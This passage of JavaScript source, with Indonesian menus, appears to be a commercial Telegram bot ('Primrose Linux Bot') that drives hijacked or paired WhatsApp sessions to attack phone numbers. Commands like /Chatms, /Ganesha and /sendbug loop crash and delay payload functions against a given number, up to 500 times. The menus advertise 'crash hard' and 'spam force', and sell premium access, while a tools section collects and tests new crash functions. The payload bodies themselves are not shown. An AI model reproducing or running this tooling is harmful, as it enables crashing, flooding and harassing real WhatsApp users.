    if (sessions.size === 0) return safeSendMessage(chatId, "❌ Tidak ada sender WhatsApp terhubung.");
    const sock = sessions.values().next().value;
    await safeSendMessage(chatId, createBugSuccessMessage(targetNumber, "Sanjiva", date), { parse_mode: "HTML", reply_markup: createCheckButton(targetNumber) });
    for (let i = 0; i < 10; i++) { await xatanicaldelayv2(sock, target); await sleep(100); }
});

bot.onText(/\/Stova(?:\s+(\d+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const chatType = msg.chat.type;
    const hasAccess = await checkUserAccess(userId, chatId, chatType, "stova");
    if (!hasAccess) return;
    if (!match[1]) return safeSendMessage(chatId, "🪧 Format: /Stova 628xxx");
    const targetNumber = match[1].replace(/[^0-9]/g, "");
    const target = `${targetNumber}@s.whatsapp.net`;
    const date = getCurrentDate();
    if (sessions.size === 0) return safeSendMessage(chatId, "❌ Tidak ada sender WhatsApp terhubung.");
    const sock = sessions.values().next().value;
    await safeSendMessage(chatId, createBugSuccessMessage(targetNumber, "Stova", date), { parse_mode: "HTML", reply_markup: createCheckButton(targetNumber) });
    for (let i = 0; i < 7; i++) { await brem(sock, target); await sleep(100); }
});

bot.onText(/\/Chatms(?:\s+(\d+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const chatType = msg.chat.type;
    const hasAccess = await checkUserAccess(userId, chatId, chatType, "chatms");
    if (!hasAccess) return;
    if (!match[1]) return safeSendMessage(chatId, "🪧 Format: /Chatms 628xxx");
    const targetNumber = match[1].replace(/[^0-9]/g, "");
    const target = `${targetNumber}@s.whatsapp.net`;
    const date = getCurrentDate();
    if (sessions.size === 0) return safeSendMessage(chatId, "❌ Tidak ada sender WhatsApp terhubung.");
    const sock = sessions.values().next().value;
    await safeSendMessage(chatId, createBugSuccessMessage(targetNumber, "Chatms", date), { parse_mode: "HTML", reply_markup: createCheckButton(targetNumber) });
    for (let i = 0; i < 500; i++) { await FCinvisTes(sock, target); await sleep(3000); }
});

bot.onText(/\/Ganesha(?:\s+(\d+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const chatType = msg.chat.type;
    const hasAccess = await checkUserAccess(userId, chatId, chatType, "ganesha");
    if (!hasAccess) return;
    if (!match[1]) return safeSendMessage(chatId, "🪧 Format: /Ganesha 628xxx");
    const targetNumber = match[1].replace(/[^0-9]/g, "");
    const target = `${targetNumber}@s.whatsapp.net`;
    const date = getCurrentDate();
    if (sessions.size === 0) return safeSendMessage(chatId, "❌ Tidak ada sender WhatsApp terhubung.");
    const sock = sessions.values().next().value;
    await safeSendMessage(chatId, createBugSuccessMessage(targetNumber, "Ganesha", date), { parse_mode: "HTML", reply_markup: createCheckButton(targetNumber) });
    for (let i = 0; i < 10; i++) { await bulldozerV2(sock, target); await sleep(100); }
});

bot.onText(/\/sendbug(?:\s+(\d+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const chatType = msg.chat.type;
    const hasAccess = await checkUserAccess(userId, chatId, chatType, "sendbug");
    if (!hasAccess) return;
    if (!match[1]) return safeSendMessage(chatId, "🪧 Format: /sendbug 628xxx");
    const targetNumber = match[1].replace(/[^0-9]/g, "");
    const target = `${targetNumber}@s.whatsapp.net`;
    const date = getCurrentDate();
    if (sessions.size === 0) return safeSendMessage(chatId, "❌ Tidak ada sender WhatsApp terhubung.");
    const sock = sessions.values().next().value;
    await safeSendMessage(chatId, createBugSuccessMessage(targetNumber, "sendbug", date), { parse_mode: "HTML", reply_markup: createCheckButton(targetNumber) });
    for (let i = 0; i < 35; i++) { await VisiFriend(sock, target); await sleep(100); }
});

// ================= OWNER/ADMIN COMMANDS ================= //

const pendingPremiumPoll = {};

bot.onText(/\/addprem\s+(\d+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const targetUserId = parseInt(match[1]);
    if (!isOwner(userId) && !adminUsers.includes(userId)) {
        return safeSendMessage(chatId, "❌ Akses ditolak! Hanya owner/admin yang bisa menggunakan command ini.");
    }
    const existing = premiumUsers.find(u => u.id === targetUserId);
    if (existing) {
        return safeSendMessage(chatId, `⚠️ User ${targetUserId} sudah menjadi premium user.`);
    }
    const options = ["💎 7 Hari", "👑 14 Hari", "🚀 30 Hari", "♾️ Permanent"];
    const poll = await bot.sendPoll(chatId, "💎 PILIH DURASI PREMIUM", options, { is_anonymous: false });
    pendingPremiumPoll[poll.poll.id] = {
        userId: targetUserId,
        adminId: userId,
        chatId: chatId
    };
});

bot.onText(/\/delprem\s+(\d+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const targetUserId = parseInt(match[1]);
    if (!isOwner(userId) && !adminUsers.includes(userId)) {
        return safeSendMessage(chatId, "❌ Akses ditolak! Hanya owner/admin yang bisa menggunakan command ini.");
    }
    const index = premiumUsers.findIndex(u => u.id === targetUserId);
    if (index === -1) {
        return safeSendMessage(chatId, `❌ User ${targetUserId} tidak ditemukan dalam daftar premium.`);
    }
    premiumUsers.splice(index, 1);
    savePremiumUsers();
    safeSendMessage(chatId, `✅ User ${targetUserId} berhasil dihapus dari daftar premium.`);
});

bot.onText(/\/addadmin\s+(\d+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const targetUserId = parseInt(match[1]);
    if (!isOwner(userId)) {
        return safeSendMessage(chatId, "❌ Akses ditolak! Hanya owner yang bisa menggunakan command ini.");
    }
    if (adminUsers.includes(targetUserId)) {
        return safeSendMessage(chatId, `⚠️ User ${targetUserId} sudah menjadi admin.`);
    }
    adminUsers.push(targetUserId);
    saveAdminUsers();
    safeSendMessage(chatId, `✅ User ${targetUserId} berhasil ditambahkan sebagai admin.`);
});

bot.onText(/\/deladmin\s+(\d+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const targetUserId = parseInt(match[1]);
    if (!isOwner(userId)) {
        return safeSendMessage(chatId, "❌ Akses ditolak! Hanya owner yang bisa menggunakan command ini.");
    }
    const index = adminUsers.indexOf(targetUserId);
    if (index === -1) {
        return safeSendMessage(chatId, `❌ User ${targetUserId} tidak ditemukan dalam daftar admin.`);
    }
    adminUsers.splice(index, 1);
    saveAdminUsers();
    safeSendMessage(chatId, `✅ User ${targetUserId} berhasil dihapus dari daftar admin.`);
});

bot.onText(/\/listprem/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    if (!isOwner(userId) && !adminUsers.includes(userId)) {
        return safeSendMessage(chatId, "❌ Akses ditolak! Hanya owner/admin yang bisa menggunakan command ini.");
    }
    if (premiumUsers.length === 0) {
        return safeSendMessage(chatId, "📌 Belum ada premium user.");
    }
    let message = `<blockquote>📋 Daftar Premium User</blockquote>\n\n`;
    premiumUsers.forEach((user, index) => {
        const expires = moment(user.expiresAt).format('YYYY-MM-DD HH:mm:ss');
        message += `${index + 1}. ID: <code>${user.id}</code>\n   Expires: ${expires}\n\n`;
    });
    safeSendMessage(chatId, message, { parse_mode: "HTML" });
});

bot.onText(/\/listadmin/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    if (!isOwner(userId) && !adminUsers.includes(userId)) {
        return safeSendMessage(chatId, "❌ Akses ditolak! Hanya owner/admin yang bisa menggunakan command ini.");
    }
    if (adminUsers.length === 0) {
        return safeSendMessage(chatId, "📌 Belum ada admin.");
    }
    let message = `<blockquote>📋 Daftar Admin</blockquote>\n\n`;
    adminUsers.forEach((admin, index) => {
        message += `${index + 1}. ID: <code>${admin}</code>\n\n`;
    });
    safeSendMessage(chatId, message, { parse_mode: "HTML" });
});

bot.onText(/\/update (on|off)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const mode = match[1].toLowerCase();
    if (!isOwner(userId) && !adminUsers.includes(userId)) {
        return safeSendMessage(chatId, "❌ Akses ditolak! Hanya owner/admin yang bisa menggunakan command ini.");
    }
    if (mode === "on") {
        autoUpdateEnabled = true;
        saveAutoUpdateSetting(true);
        startAutoUpdateChecker();
        await safeSendMessage(chatId, `✅ Auto update diaktifkan! Bot akan otomatis update ketika ada versi baru di GitHub.`);
    } else if (mode === "off") {
        autoUpdateEnabled = false;
        saveAutoUpdateSetting(false);
        stopAutoUpdateChecker();
        await safeSendMessage(chatId, `❌ Auto update dinonaktifkan! Gunakan /autoupdate untuk update manual.`);
    }
});

bot.onText(/\/autoupdate/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    if (!isOwner(userId) && !adminUsers.includes(userId)) {
        return safeSendMessage(chatId, "❌ Akses ditolak! Hanya owner/admin yang bisa menggunakan command ini.");
    }
    const statusMsg = await safeSendMessage(chatId, "🔄 Mengecek update dari GitHub...");
    if (!statusMsg) return;
    const update = await checkForUpdates();
    if (!update.hasUpdate) {
        await safeEditMessageText(chatId, statusMsg.message_id, `✅ Bot sudah versi terbaru! (v${CURRENT_VERSION})`);
        return;
    }
    await safeEditMessageText(chatId, statusMsg.message_id, `📦 Update ditemukan! Versi ${CURRENT_VERSION} → ${update.newVersion}\n🔄 Melakukan update...`);
    await performUpdate(chatId);
});

bot.onText(/\/checkupdate/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    if (!isOwner(userId) && !adminUsers.includes(userId)) {
        return safeSendMessage(chatId, "❌ Akses ditolak! Hanya owner/admin yang bisa menggunakan command ini.");
    }
    const statusMsg = await safeSendMessage(chatId, "🔍 Mengecek update dari GitHub...");
    if (!statusMsg) return;
    const update = await checkForUpdates();
    if (update.hasUpdate) {
        await safeEditMessageText(chatId, statusMsg.message_id, `📦 Update tersedia!\n\nVersi saat ini: v${CURRENT_VERSION}\nVersi terbaru: v${update.newVersion}\n\nGunakan /autoupdate untuk update.`);
    } else {
        await safeEditMessageText(chatId, statusMsg.message_id, `✅ Bot sudah versi terbaru! (v${CURRENT_VERSION})\n\nAuto Update: ${autoUpdateEnabled ? "ON (otomatis)" : "OFF (manual)"}`);
    }
});

bot.onText(/\/blokcmd (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    if (!isOwner(userId) && !adminUsers.includes(userId)) {
        return safeSendMessage(chatId, "❌ Akses ditolak! Hanya owner/admin yang bisa menggunakan command ini.");
    }
    const commandName = match[1].toLowerCase().replace("/", "");
    if (isCommandBlocked(commandName)) {
        return safeSendMessage(chatId, `⚠️ Command /${commandName} sudah dalam keadaan diblokir.`);
    }
    blockedCommands.push(commandName);
    saveBlockedCommands(blockedCommands);
    safeSendMessage(chatId, `✅ Command /${commandName} berhasil diblokir. User tidak akan bisa menggunakan command ini.`);
});

bot.onText(/\/bukacmd (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    if (!isOwner(userId) && !adminUsers.includes(userId)) {
        return safeSendMessage(chatId, "❌ Akses ditolak! Hanya owner/admin yang bisa menggunakan command ini.");
    }
    const commandName = match[1].toLowerCase().replace("/", "");
    if (!isCommandBlocked(commandName)) {
        return safeSendMessage(chatId, `⚠️ Command /${commandName} tidak dalam keadaan diblokir.`);
    }
    blockedCommands = blockedCommands.filter(cmd => cmd !== commandName);
    saveBlockedCommands(blockedCommands);
    safeSendMessage(chatId, `✅ Command /${commandName} berhasil dibuka. User bisa menggunakan command ini kembali.`);
});

bot.onText(/\/addpremgrup\s+(\d+)([dhm])?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const chatType = msg.chat.type;
    if (chatType !== "group" && chatType !== "supergroup") {
        return safeSendMessage(chatId, "❌ Command ini hanya bisa digunakan di dalam grup!");
    }
    if (!isOwner(userId) && !adminUsers.includes(userId)) {
        return safeSendMessage(chatId, "❌ Akses ditolak! Hanya owner/admin yang bisa menggunakan command ini.");
    }
    const jumlah = parseInt(match[1]);
    const unit = match[2] || 'd';
    let days = jumlah;
    if (unit === 'h') days = jumlah / 24;
    if (unit === 'm') days = jumlah / (24 * 30);
    if (days < 1) days = 1;
    await addGroupPremium(chatId, Math.floor(days), userId);
    const chat = await bot.getChat(chatId);
    safeSendMessage(chatId, `✅ Grup "${chat.title}" berhasil ditambahkan ke premium selama ${jumlah}${unit === 'd' ? ' hari' : unit === 'h' ? ' jam' : ' bulan'}! Anggota grup dapat mengetik "add" untuk mendapatkan akses premium.`);
});

bot.onText(/\/delpremgrup/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const chatType = msg.chat.type;
    if (chatType !== "group" && chatType !== "supergroup") {
        return safeSendMessage(chatId, "❌ Command ini hanya bisa digunakan di dalam grup!");
    }
    if (!isOwner(userId) && !adminUsers.includes(userId)) {
        return safeSendMessage(chatId, "❌ Akses ditolak! Hanya owner/admin yang bisa menggunakan command ini.");
    }
    const groupId = chatId.toString();
    const existingGroup = groupPremiumData.find(g => g.groupId === groupId);
    if (!existingGroup) {
        return safeSendMessage(chatId, "❌ Grup ini tidak terdaftar dalam premium grup.");
    }
    removeGroupPremium(chatId);
    const chat = await bot.getChat(chatId);
    safeSendMessage(chatId, `✅ Grup "${chat.title}" berhasil dihapus dari daftar premium grup.`);
});

bot.onText(/\/listpremgrub/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const chatType = msg.chat.type;
    if (chatType !== "group" && chatType !== "supergroup") {
        return safeSendMessage(chatId, "❌ Command ini hanya bisa digunakan di dalam grup!");
    }
    if (!isOwner(userId) && !adminUsers.includes(userId)) {
        return safeSendMessage(chatId, "❌ Akses ditolak! Hanya owner/admin yang bisa menggunakan command ini.");
    }
    const groupId = chatId.toString();
    const group = groupPremiumData.find(g => g.groupId === groupId);
    if (!group) {
        return safeSendMessage(chatId, "❌ Grup ini tidak terdaftar dalam premium grup.");
    }
    if (group.members.length === 0) {
        return safeSendMessage(chatId, "📌 Belum ada member yang mendaftar premium di grup ini.");
    }
    let message = `<blockquote>📋 Daftar Premium Member</blockquote>\n`;
    message += `Grup: ${group.groupTitle}\n`;
    message += `Expires: ${moment(group.expiresAt).format('YYYY-MM-DD HH:mm:ss')}\n━━━━━━━━━━━━━━━━━━\n`;
    group.members.forEach((member, index) => {
        const expires = moment(member.expiresAt).format('YYYY-MM-DD');
        message += `${index + 1}. ${member.username || `User ${member.userId}`}\n   ID: <code>${member.userId}</code>\n   Exp: ${expires}\n\n`;
    });
    safeSendMessage(chatId, message, { parse_mode: "HTML" });
});

bot.onText(/^add$/i, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const username = msg.from.username || msg.from.first_name;
    const chatType = msg.chat.type;
    if (chatType !== "group" && chatType !== "supergroup") return;
    const groupId = chatId.toString();
    const group = groupPremiumData.find(g => g.groupId === groupId);
    if (!group) {
        return safeSendMessage(chatId, "❌ Grup ini tidak terdaftar dalam premium grup. Hubungi admin untuk mendaftarkan grup.");
    }
    if (Date.now() > group.expiresAt) {
        return safeSendMessage(chatId, "❌ Masa berlaku premium grup ini sudah habis. Hubungi admin untuk memperpanjang.");
    }
    if (isPremium(userId)) {
        return safeSendMessage(chatId, `✅ @${username || userId} sudah memiliki akses premium!`, { parse_mode: "HTML" });
    }
    const remainingDays = Math.ceil((group.expiresAt - Date.now()) / (1000 * 60 * 60 * 24));
    await addMemberPremiumFromGroup(chatId, userId, username, remainingDays);
    safeSendMessage(chatId, `✅ Selamat @${username || userId}! Anda telah mendapatkan akses premium selama ${remainingDays} hari. Silakan gunakan command bug yang tersedia.`, { parse_mode: "HTML" });
});

bot.onText(/\/reqpair (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    
    if (!adminUsers.includes(userId) && !isOwner(userId)) {
        return safeSendPhoto(chatId, thumbnailUrl, {
            caption: `<blockquote>Access Admin</blockquote>Please Buy Access Admin To The Owner!`,
            parse_mode: "HTML",
            reply_markup: { inline_keyboard: [[{ text: "Owner", url: "https://t.me/ItsMeXanderRzMd" }]] }
        });
    }
    
    if (!match[1]) {
        return safeSendMessage(chatId, "❌ Missing input. Please provide the number. Example: /reqpair 62xxxx.");
    }
    
    const botNumber = match[1].replace(/[^0-9]/g, "");
    if (!botNumber || botNumber.length < 10) {
        return safeSendMessage(chatId, "❌ Nomor yang diberikan tidak valid. Pastikan nomor yang dimasukkan benar.");
    }
    
    if (sessions.has(botNumber)) {
        return safeSendMessage(chatId, `✅ Nomor ${botNumber} sudah terhubung dan aktif.`);
    }
    
    if (pairingInProgress.has(botNumber)) {
        const elapsed = Date.now() - pairingInProgress.get(botNumber);
        if (elapsed < PAIRING_COOLDOWN) {
            return safeSendMessage(chatId, `⚠️ Pairing untuk nomor ${botNumber} sedang berlangsung. Tunggu ${Math.ceil((PAIRING_COOLDOWN - elapsed) / 1000)} detik lagi.`);
        } else {
            pairingInProgress.delete(botNumber);
        }
    }
    
    try {
        await ConnectToWhatsApp(botNumber, chatId);
    } catch (error) {
        console.error("Error in Connect:", error);
        pairingInProgress.delete(botNumber);
        
        let errorMsg = "Terjadi kesalahan saat menghubungkan ke WhatsApp.";
        if (error.message.includes("timeout")) {
            errorMsg = "⏰ Koneksi timeout. Silakan coba lagi.";
        } else if (error.message.includes("blocked")) {
            errorMsg = "🚫 Nomor diblokir atau sudah logout. Coba nomor lain.";
        } else if (error.message.includes("logged out")) {
            errorMsg = "🔒 Session expired. Silakan coba lagi.";
        }
        
        safeSendMessage(chatId, `❌ ${errorMsg}\n\nSilakan coba /reqpair ${botNumber} lagi.`);
    }
});

// ================= POLL & CALLBACK HANDLERS ================= //

bot.on("poll_answer", async (answer) => {
    // Premium poll
    const premiumData = pendingPremiumPoll[answer.poll_id];
    if (premiumData) {
        if (answer.user.id !== premiumData.adminId) return;
        const choice = answer.option_ids[0];
        let days;
        if (choice === 0) days = 7;
        if (choice === 1) days = 14;
        if (choice === 2) days = 30;
        if (choice === 3) days = "permanent";
        let expiresAt;
        if (days === "permanent") {
            expiresAt = "permanent";
        } else {
            expiresAt = Date.now() + days * 86400000;
        }
        const existing = premiumUsers.find(u => u.id === premiumData.userId);
        if (!existing) {
            premiumUsers.push({ id: premiumData.userId, expiresAt });
        } else {
            existing.expiresAt = expiresAt;
        }
        savePremiumUsers();
        safeSendMessage(premiumData.chatId, `✅ Premium berhasil ditambahkan\n\n👤 User ID: ${premiumData.userId}\n⏳ Durasi: ${days === "permanent" ? "Permanent" : days + " Hari"}`);
        delete pendingPremiumPoll[answer.poll_id];
        return;
    }
    
    // Color poll
    const colorData = pendingColorPoll[answer.poll_id];
    if (colorData) {
        const selectedOption = answer.option_ids[0];
        let selectedColor = "";
        if (selectedOption === 0) selectedColor = "XRED";
        else if (selectedOption === 1) selectedColor = "XBLUE";
        else if (selectedOption === 2) selectedColor = "XGREEN";
        else if (selectedOption === 3) selectedColor = "XWHITE";
        else if (selectedOption === 4) selectedColor = "XDISCO";
        const colorValue = getColorFromChoice(selectedColor);
        saveColorSetting(colorValue);
        currentColor = colorValue;
        if (buttonIntervals.has(colorData.currentMessageId)) {
            clearInterval(buttonIntervals.get(colorData.currentMessageId));
            buttonIntervals.delete(colorData.currentMessageId);
        }
        if (globalIntervalId) {
            clearInterval(globalIntervalId);
            globalIntervalId = null;
        }
        discoActive = false;
        await sendColoredMenu(colorData.chatId, colorData.from, colorValue, colorData.currentMessageId);
        delete pendingColorPoll[answer.poll_id];
        return;
    }
});

bot.on("callback_query", async (query) => {
    if (!query.message) return;
    const chatId = query.message.chat.id;
    const currentMessageId = query.message.message_id;
    const data = query.data;
    const userId = query.from.id;

    if (data && data.startsWith("autofix_")) {
        const originalMsgId = parseInt(data.replace("autofix_", ""));
        const pendingData = global.pendingFix ? global.pendingFix[originalMsgId] : null;
        if (!pendingData) {
            await bot.answerCallbackQuery(query.id, { text: "❌ Data tidak ditemukan, coba ulangi /cekfunc" }).catch(() => {});
            return;
        }
        await bot.answerCallbackQuery(query.id, { text: "🔧 Memperbaiki code 100% akurat..." }).catch(() => {});
        const fixResult = autoFixJavaScript(pendingData.code, pendingData.error);
        let resultText = `✅ *CODE DIPERBAIKI 100%!*\n\n`;
        resultText += `📊 *${fixResult.fixes.length} perbaikan:*\n`;
        fixResult.fixes.slice(0, 10).forEach(f => resultText += `• ${f}\n`);
        resultText += `\n🟢 *HASIL AKHIR:*\n\`\`\`javascript\n${fixResult.fixed.substring(0, 2000)}\n\`\`\``;
        if (fixResult.fixed.length > 2000) {
            resultText += `\n\n📁 Code panjang, dikirim sebagai file...`;
            await safeSendMessage(chatId, resultText, { parse_mode: "Markdown" });
            const filePath = `fixed_${Date.now()}.js`;
            fs.writeFileSync(filePath, fixResult.fixed);
            await bot.sendDocument(chatId, filePath, { caption: `✅ Fixed code - ${fixResult.fixes.length} issues fixed` });
            fs.unlinkSync(filePath);
        } else {
            await safeSendMessage(chatId, resultText, { parse_mode: "Markdown" });
        }
        delete global.pendingFix[originalMsgId];
        await bot.answerCallbackQuery(query.id).catch(() => {});
        return;
    }

    if (buttonIntervals.has(currentMessageId)) {
        clearInterval(buttonIntervals.get(currentMessageId));
        buttonIntervals.delete(currentMessageId);
    }
    if (globalIntervalId) {
        clearInterval(globalIntervalId);
        globalIntervalId = null;
    }
    discoActive = false;

    let caption = "";
    let replyMarkup = {};
    let selectedImage = getRandomImage();

    if (data === "trashmenu") {
        caption = `<blockquote>─━━─━━⧼ BUG MENU ⧽─━━─━━</blockquote>
<b>─━━─━━⧼ INFORMASI USER ⧽─━━─━━:</b>
🎩 Pemilik : @ItsMeXanderRzMd 🌟    
😄 Owner : @realmarz 🌟
🍽 Version : ${CURRENT_VERSION}
🗡 Platform : Telegram
<b>─━━─━━⧼ FITUR BUG ⧽─━━─━━:</b>
─▢ /sendbug +628
─▢ /clear +628
<b>╰➤ hapus bug</b>
<b>─━━─━━⧼ BUG MENU ⧽─━━─━━:</b>
# Primrose Linux Bot 𖣂
─▢ /Xploit 
<b>╰➤ blank hard</b>
─▢ /Sanjiva
<b>╰➤ delay hard murbug</b>
─▢ /Stova 
<b>╰➤ new delay brutality murbug</b>
─▢ /Chatms +628
<b>╰➤ crash hard</b>
─▢ /Ganesha +628
<b>╰➤ Buldo hard</b>
─▢ /XspamForce +628
<b>╰➤ spam force anti kenok (2 function combo)</b>
<pre>──────────────────────────
   MENU: Pilih Fitur Bug Menu di Atas 
──────────────────────────</pre>`
        replyMarkup = { inline_keyboard: [[{ text: "🔙 BACK", callback_data: "back_to_main" }]] }
    } else if (data === "owner_menu") {
        caption = `<blockquote><b>☠ PRIMROSE LINUX BOT ACCESS ☠</b></blockquote>
🎩 Pemilik : @ItsMeXanderRzMd 🌟    
😄 Owner : @realmarz 🌟
🍽 Version : ${CURRENT_VERSION}
🗡 Platform : Telegram     
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃      ▢ /addprem &lt;id&gt;
┃      ╰➤ Menambahkan akses premium pada user
┃      ▢ /delprem &lt;id&gt;
┃      ╰➤ Menghapus akses premium pada user
┃      ▢ /addadmin &lt;id&gt;
┃      ╰➤ Menambahkan akses admin pada user
┃      ▢ /deladmin &lt;id&gt;
┃      ╰➤ Menghapus akses admin pada user
┃      ▢ /listprem
┃      ╰➤ Melihat list premium user yang ada
┃      ▢ /listadmin
┃      ╰➤ Melihat list admin
┃      ▢ /reqpair ☇ Number
┃      ╰➤ Menambah Sender WhatsApp
┃      ▢ /update on/off
┃      ╰➤ Mengaktifkan/menonaktifkan auto update
┃      ▢ /autoupdate
┃      ╰➤ Update manual dari GitHub
┃      ▢ /checkupdate
┃      ╰➤ Cek versi terbaru
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
<blockquote><b>NOTE:</b>
Baca dengan teliti Jangan asal ngetik untuk mendapatkan akses</blockquote>`
        replyMarkup = { inline_keyboard: [[{ text: "🔙 BACK", callback_data: "back_to_main" }]] }
    } else if (data === "group_security_menu") {
        caption = `<blockquote><b>🔒 XGROUPSECURITY MENU 🔒</b></blockquote>
🎩 Pemilik : @ItsMeXanderRzMd 🌟
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃      ▢ /blokcmd &lt;command&gt;
┃      ╰➤ Mem-block command bug
┃      ▢ /bukacmd &lt;command&gt;
┃      ╰➤ Membuka block command bug
┃      ▢ /addpremgrup &lt;hari&gt;
┃      ╰➤ Menambah grup ke premium (gunakan di grup)
┃      ▢ /delpremgrup
┃      ╰➤ Menghapus grup dari premium
┃      ▢ /listpremgrub
┃      ╰➤ Menampilkan member premium dalam grup
┃      ▢ /add (ketik "add" di grup premium)
┃      ╰➤ Menambah diri sebagai premium user
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
<blockquote><b>NOTE:</b>
Command hanya bisa digunakan oleh admin grup</blockquote>`
        replyMarkup = { inline_keyboard: [[{ text: "🔙 BACK", callback_data: "back_to_main" }]] }
    } else if (data === "toolsbug_menu") {
        caption = `<blockquote><b>🛠️ XTOOLSBUG MENU 🛠️</b></blockquote>
🎩 Pemilik : @ItsMeXanderRzMd 🌟
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃      ▢ /testfunction &lt;number&gt; &lt;jumlah&gt;
┃      ╰➤ Reply dengan function bug
┃      ▢ /celahfunc &lt;reply func atau file&gt;
┃      ╰➤ Extract celah dari function
┃      ▢ /addcelah &lt;reply func atau file&gt;
┃      ╰➤ Menyimpan celah ke database
┃      ▢ /listcelah
┃      ╰➤ Menampilkan semua celah tersimpan
┃      ▢ /delcelah &lt;id&gt;
┃      ╰➤ Menghapus celah dari database
┃      ▢ /cekfunc &lt;reply func&gt;
┃      ╰➤ Cek error function + auto fix 100%
┃      ▢ /addparticipant &lt;reply func&gt;
┃      ╰➤ Tambah participant ke relayMessage
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
<blockquote><b>NOTE:</b>
Gunakan tools ini untuk testing dan debugging</blockquote>`
        replyMarkup = { inline_keyboard: [[{ text: "🔙 BACK", callback_data: "back_to_main" }]] }
    } else if (data === "change_color_menu") {
        const options = ["🔴 XRED", "🔵 XBLUE", "🟢 XGREEN", "⚪ XWHITE", "🌈 XDISCO"]
        const poll = await bot.sendPoll(chatId, "🎨 PILIH WARNA BUTTON", options, { is_anonymous: false, allows_multiple_answers: false })
        pendingColorPoll[poll.poll.id] = { chatId: chatId, userId: userId, from: query.from, currentMessageId: currentMessageId }
        return await bot.answerCallbackQuery(query.id).catch(() => {});
    } else if (data === "back_to_main") {
        const runtimeStatus = formatRuntime()
        const memoryStatus = formatMemory()
        const status = sessions.size > 0 ? "🟢 ACTIVE" : "🔴 OFFLINE"
        const botNumber = sessions.size
        const isWhite = (currentColor === "secondary")
        const buttonStyle = isWhite ? undefined : (currentColor === "disco" ? buttonStyles[0] : currentColor)
        let keyboard = [
            [{ text: "XBUGS", callback_data: "trashmenu", style: buttonStyle }, { text: "XTOOLSBUG", callback_data: "toolsbug_menu", style: buttonStyle }],
            [{ text: "XSETTINGS", callback_data: "owner_menu", style: buttonStyle }, { text: "XGROUPSECURITY", callback_data: "group_security_menu", style: buttonStyle }],
            [{ text: "XCHANGECOLOR", callback_data: "change_color_menu", style: buttonStyle }, { text: "DEVELOPERS", url: "https://t.me/ItsMeXanderRzMd", style: buttonStyle }]
        ]
        if (isWhite) keyboard = JSON.parse(JSON.stringify(keyboard).replace(/"style":undefined/g, '"style":null').replace(/"style":null/g, ''))
        const caption = `<blockquote><strong>☠ # Primrose Linux Bot 𖣂 ☠</strong></blockquote>
🎩 Pemilik : @ItsMeXanderRzMd 🌟    
😄 Owner : @realmarz 🌟
🍽 Version : ${CURRENT_VERSION} 
🗡 Platform : Telegram
<blockquote><b>――⧼ STATUS BOT ⧽――</b></blockquote>
⛧ Status : ${status}
⛧ Number : ${botNumber}
⛧ Runtime : ${runtimeStatus}
⛧ Memory : ${memoryStatus}`
        await safeEditMessageMedia(chatId, currentMessageId, { type: 'photo', media: getRandomImage(), caption: caption, parse_mode: "HTML" }, { reply_markup: { inline_keyboard: keyboard } })
        if (currentColor === "disco") {
            if (buttonIntervals.has(currentMessageId)) {
                clearInterval(buttonIntervals.get(currentMessageId))
                buttonIntervals.delete(currentMessageId)
            }
            if (globalIntervalId) clearInterval(globalIntervalId)
            discoActive = true
            let index = 0
            globalIntervalId = setInterval(async () => {
                if (!discoActive) return
                index = (index + 1) % buttonStyles.length
                const newStyle = buttonStyles[index]
                let newKeyboard = [
                    [{ text: "XBUGS", callback_data: "trashmenu", style: newStyle }, { text: "XTOOLSBUG", callback_data: "toolsbug_menu", style: newStyle }],
                    [{ text: "XSETTINGS", callback_data: "owner_menu", style: newStyle }, { text: "XGROUPSECURITY", callback_data: "group_security_menu", style: newStyle }],
                    [{ text: "XCHANGECOLOR", callback_data: "change_color_menu", style: newStyle }, { text: "DEVELOPERS", url: "https://t.me/ItsMeXanderRzMd", style: newStyle }]
                ]
                await safeEditMessageReplyMarkup(chatId, currentMessageId, { inline_keyboard: newKeyboard });
            }, 1500)
            buttonIntervals.set(currentMessageId, globalIntervalId)
        }
        return await bot.answerCallbackQuery(query.id).catch(() => {});
    }

    if (caption !== "") {
        await safeEditMessageMedia(chatId, currentMessageId, { type: 'photo', media: selectedImage, caption: caption, parse_mode: "HTML" }, { reply_markup: replyMarkup });
    }
    await bot.answerCallbackQuery(query.id).catch(() => {});
});

process.on('unhandledRejection', (reason, promise) => {
    console.error(chalk.red('Unhandled Rejection at:', promise, 'reason:', reason));
});

process.on('uncaughtException', (error) => {
    console.error(chalk.red('Uncaught Exception:', error));
});

startAutoUpdateChecker();
startBot();
initializeWhatsAppConnections();